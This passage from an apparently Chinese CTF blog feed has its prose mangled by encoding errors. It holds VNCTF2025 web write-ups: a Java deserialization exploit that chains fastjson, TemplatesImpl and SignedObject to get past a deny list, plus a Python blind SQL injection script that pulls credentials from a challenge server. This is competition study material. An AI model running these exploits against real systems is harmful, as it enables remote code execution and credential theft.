<span class="hljs-variable">person</span> <span class="hljs-operator">=</span> fury.deserialize(decode);<br>                <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> JSONUtil.parseObj(person);<br>                model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, entries.toString());<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;error apistr&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¾èµ–ä¹Ÿæ˜¯hutoolï¼Œå¤šäº†springã€jacksonã€thymeleafã€snakeyamlè¿™äº›ã€‚</p><p>è€Œæ¯å¹´çš„AliyunCTFéƒ½ä¼šè®©åé¢å¤§å¤§å°å°çš„CTFæœ‰æ‰€å€Ÿé‰´ï¼Œæˆ–è®¸å¯¹äºfuryååºåˆ—åŒ–çš„ç ”ç©¶æ˜¯å³å°†æˆä¸ºä¼—çŸ¢ä¹‹çš„äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025-WEB</title>
    <link href="/2025/02/09/VNCTF2025-WEB/"/>
    <url>/2025/02/09/VNCTF2025-WEB/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>éšä¾¿çœ‹çœ‹ï¼Œéšä¾¿æ‰“æ‰“ã€‚</p><p>SQLä¸æƒ³åšã€‚</p><h2 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a>javaGuide</h2><p>æ¯”è¾ƒç®€å•çš„ç¼åˆï¼Œé¢˜ç›®ç»™äº†ä¸€ä¸ªååºåˆ—åŒ–å…¥å£ï¼Œä¾èµ–æ˜¯<code>fastjson1.2.83</code>ï¼Œå¯ä»¥ç›´æ¥ç”¨fjåŸç”Ÿæ‰“åº•ã€‚</p><p>ä½†è¿™é‡Œé‡å†™äº†<code>resolveClass</code>æ¥å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œcheckï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;com.fasterxml.jackson&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(String denyClass : denyClasses) &#123;<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶ç›´æ¥bançš„æ˜¯<code>TemplateImpl</code>å’Œ<code>BadAttributeValueExpException</code>ä»¥åŠ<code>Jackson</code>ï¼Œä½†æ˜¯ä»ç„¶æœ‰ç»•è¿‡çš„æ–¹æ³•ã€‚</p><p>é¦–å…ˆæˆ‘æƒ³åˆ°äº†ç”¨<code>UTF-8 Overlong Encoding</code>ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ¬¡ç«Ÿç„¶æ²¡æˆåŠŸï¼Œè¿‡ä¸äº†è¿™é‡Œçš„<code>resolveClass</code>ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210004822341.png" alt="image-20250210004822341"></p><p>è¿™é‡Œç›´æ¥è°ƒäº†Jacksonï¼Œå¯èƒ½æ˜¯è¿™ä¸ªåŸå› ã€‚</p><p>ç»•è¿™ä¸ª<code>resolveClass</code>çš„å¸¸è§æ–¹æ³•è¿˜æœ‰<code>SignedObject</code>äºŒæ¬¡ååºåˆ—åŒ–ï¼Œä½†æ˜¯ç›´æ¥æ‰“ä¹Ÿç»•ä¸è¿‡<code>javax.management.BadAttributeValueExpException</code>ï¼Œè¿™é‡Œæ¢ä¸€ä¸ªè§¦å‘çš„<code>EventListenerList</code>ï¼Œè¿™ä¸ªæ¥è‡ª<code>Jackson</code>åŸç”Ÿã€‚</p><p>ä¸€è°ƒå°±é€šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.example.javaguide.MyObjectInputStream;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.KeyPair;<br><span class="hljs-keyword">import</span> java.security.KeyPairGenerator;<br><span class="hljs-keyword">import</span> java.security.Signature;<br><span class="hljs-keyword">import</span> java.security.SignedObject;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br><br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        list.add(templates);          <span class="hljs-comment">//ç¬¬ä¸€æ¬¡æ·»åŠ ä¸ºäº†ä½¿å¾—templateså˜æˆå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡JsonArrayçš„resolveClassé»‘åå•æ£€æµ‹</span><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray2.add(templates);           <span class="hljs-comment">//æ­¤æ—¶åœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º</span><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray2);<br><br>        list.add(bd);<br><br>        <span class="hljs-comment">//äºŒæ¬¡ååºåˆ—åŒ–</span><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) list, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-comment">//è§¦å‘SignedObject#getObject</span><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray1.add(signedObject);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(jsonArray1);<br>        setValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        <span class="hljs-comment">//BadAttributeValueExpException bd1 = new BadAttributeValueExpException(null);</span><br>        <span class="hljs-comment">//setFieldValue(bd1,&quot;val&quot;,jsonArray1);</span><br><br><br>        <span class="hljs-comment">//éªŒè¯</span><br>        <span class="hljs-type">byte</span>[] payload = ser(eventListenerList);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload_b64</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(payload_b64);<br><br>        <span class="hljs-comment">//å¤šæ‰“ä¸¤æ¬¡ï¼Œæ‰èƒ½ç¼“å­˜æˆåŠŸ</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-comment">//try &#123;</span><br>        <span class="hljs-comment">//    des_waf(payload_b64);</span><br>        <span class="hljs-comment">//&#125; catch (Exception e)&#123;</span><br>        <span class="hljs-comment">//    ;</span><br>        <span class="hljs-comment">//&#125;</span><br>        <span class="hljs-comment">//Unauthorized deserialization attempt; javax.management.BadAttributeValueExpExceptionç”¨EventListnerListç»•äº†</span><br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_normal</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">des_waf</span><span class="hljs-params">(String payload)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(payload);<br>        <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005304971.png" alt="image-20250210005304971"></p><p>é¢˜ç›®è¯´äº†ä¸å‡ºç½‘ï¼Œå¥—ä¸€ä¸ªSpringå†…å­˜é©¬å†™å…¥byteCodeå°±å®Œäº‹äº†ã€‚</p><p>æ³¨æ„äºŒæ¬¡ååºåˆ—åŒ–ç¬¬ä¸€æ¬¡ä¼šæŠ¥æ„é€ å‡½æ•°çš„é”™ï¼Œå› ä¸ºæ²¡æœ‰ç¼“å­˜ï¼Œè¿™ç§æƒ…å†µæ‰“ä¸¤æ¬¡å°±å¥½äº†ã€‚</p><p>æœ¬åœ°ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005422676.png" alt="image-20250210005422676"></p><p>è¿œç¨‹ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210005433478.png" alt="image-20250210005433478"></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/qq_44223394/article/details/131696371">fastjson1.2.83ååºåˆ—åŒ–æ¼æ´_fastjson 1.2.83æ¼æ´-CSDNåšå®¢</a></p><p><a href="https://dummykitty.github.io/java/2023/07/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-resolveClass.html">Java ååºåˆ—åŒ–ç»•è¿‡ resolvClass - DumKiyâ€™s blog</a></p><p><a href="https://www.freebuf.com/articles/network/369855.html">Fastjson ç»“åˆ jdk åŸç”Ÿååºåˆ—åŒ–çš„åˆ©ç”¨æ‰‹æ³• ( Aliyun CTF ) - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://github.com/Avento/MemShell4Spring/blob/main/No2_ControllerHandlerShell.java">MemShell4Spring&#x2F;No2_ControllerHandlerShell.java at main Â· Avento&#x2F;MemShell4Spring</a></p><h2 id="å¥¶é¾™å›å®¶"><a href="#å¥¶é¾™å›å®¶" class="headerlink" title="å¥¶é¾™å›å®¶"></a>å¥¶é¾™å›å®¶</h2><p>Sqliteæ•°æ®åº“çš„æ—¶é—´ç›²æ³¨ã€‚</p><p>ä¹Ÿèƒ½æµ‹å‡ºwafæ˜¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span>,ç©ºæ ¼,<span class="hljs-operator">=</span>,sleep,bench<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>randomblob</code>æ›¿æ¢ã€‚è€Œä¸”<code>/**/</code>ä¹Ÿæ²¡banï¼Œå¥—ä¸€ä¸‹å®˜æ–¹çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:44824/login&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">500</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">128</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span>(low&lt;high):<br>        time.sleep(<span class="hljs-number">0.2</span>)<br>        payload = <span class="hljs-string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(username))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(mid))<br>        <span class="hljs-comment"># payload= &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(50000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br>        <span class="hljs-comment"># payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(300000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br><br>        datas = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eddie&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload<br>        &#125;<br>        <span class="hljs-comment"># print(datas)</span><br>        start_time=time.time()<br>        res = requests.post(url=url,json=datas)<br>        end_time=time.time()<br>        spend_time=end_time-start_time<br>        <span class="hljs-keyword">if</span> spend_time&gt;=<span class="hljs-number">0.19</span>:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span>(mid ==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid ==<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">break</span><br>    flag = flag+<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>+<span class="hljs-built_in">bytes</span>.fromhex(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>è·‘å‡ºusernameå’Œpasswordï¼Œä½†æœ‰å¯èƒ½è·‘é”™ï¼Œæ‰€ä»¥å¤šè·‘å‡ æ¬¡ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144139964.png" alt="image-20250210144139964"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144841158.png" alt="image-20250210144841158"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nailong/woaipangmao114514<br></code></pre></td></tr></table></figure><p>ç™»å½•è·å¾—flagï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250210144719548.png" alt="image-20250210144719548"></p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/network/324785.html">SQLiteæ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>è¯»å–æºç ï¼Œå¯ä»¥å‘ç°æœ‰ä»»æ„æ–‡ä»¶è¯»å–è·¯ç”±ï¼Œkey.goæ²¡æœ‰ç›´æ¥ç»™æˆ‘ä»¬ï¼Œåº”è¯¥æ˜¯è¦æˆ‘ä»¬å»è¯»çš„ã€‚</p><p>ç„¶åè·Ÿä¸€ä¸‹ä¼šå‘ç°key.goå½±å“jwtçš„tokenç”Ÿæˆï¼Œæœ‰ä¸€ä¸ª&#x2F;evalçš„æ‰§è¡Œæ²™ç®±ä»£ç ï¼Œä½†æ˜¯éœ€è¦adminçš„é‰´æƒï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span 